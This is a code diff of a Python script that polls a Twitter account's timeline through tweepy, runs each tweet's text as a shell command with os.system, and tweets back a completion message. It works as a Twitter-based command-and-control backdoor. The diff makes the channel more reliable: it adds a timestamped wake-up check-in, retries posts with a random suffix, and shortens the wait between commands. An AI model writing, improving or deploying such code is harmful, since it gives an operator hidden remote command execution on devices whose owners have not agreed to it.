@@ -8,6 +8,8 @@ import os
 
 import tweepy
 import time
+import random
+import datetime
 
 consumer_key = consumer_key
 consumer_secret = CONSUMER_SECRET_KEY
@@ -28,8 +30,9 @@ def get_tweets(username):
 
     for tweet in tweepy.Cursor(api.user_timeline, screen_name = username).items(number_of_tweets):
         if (updated_status == False) :
-            tweet_status = "Your Device have woken up"
+            tweet_status = "Device woke at " + str(datetime.datetime.now())
             status = api.update_status(status=tweet_status)
+
             updated_status = True
 
         tweet = str(tweet)
@@ -38,12 +41,17 @@ def get_tweets(username):
         tweetdata = tweetdata.group(1)
         if (tweetdata.find("READY FOR NEXT COMMAND") == -1):
             os.system(tweetdata)
-            tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND"
-            status = api.update_status(status=tweet_status)
-            time.sleep(120)
+            try:
+                tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND"
+                status = api.update_status(status=tweet_status)
+            except:
+                tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND " + str(random.randint(1,99999))
+                status = api.update_status(status=tweet_status)               
+            time.sleep(1)
         else:
             time.sleep(10)
     
+
 
 
 while(1):
